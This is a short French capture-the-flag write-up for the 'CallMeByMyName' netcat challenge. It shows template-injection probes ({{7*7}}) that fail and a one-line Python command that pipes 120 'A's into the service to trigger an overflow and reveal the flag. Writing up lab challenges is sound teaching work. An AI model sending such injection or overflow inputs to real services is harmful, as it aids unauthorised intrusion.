# WriteUp CallMeByMyName

se connecter: `nc 0xhorizon.eu 8888`
On nous demande notre nom pour ensuite afficher Hello prenom
Ex:
```shell
Hello ! What's your name ?
tyki6
Hello tyki6
```

## Testons des injections

Essayons de voir si il y a une template derrière.On va tenter de faire un payload qui contient une opération pour voir si on a non pas notre opération mais le résultat de celle-ci (ex: on envoie 7*7 cela nous donne 49)
Test:

```shell
Hello ! What's your name ?
{{7*7}}}
Hello {{7*7}}}
```

Nop!

Test:

```shell
Hello ! What's your name ?
{7*7}}
Hello {7*7}}
```

Toujours pas

Bon on va essayer autre chose.

## Segmentation fault

Par curiosité je voulais savoir ce que ça fesait si on injectait 1000 caractères.
Appuyer pleins de fois sur A et Bingo on a le flag(un peu de chance sur celui-ci).

Pour la rapidité:  `python -c "print(120*'A')" | nc 0xhorizon.eu 8888`

```bash
python -c "print(120*'A')" | nc 0xhorizon.eu 8888
Hello ! What's your name ?
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Good job here is your flag: horiz0nx{FLAG}
```

Pour les plus curieux c'est à partir de 120 caractères que le programme donne le flag.
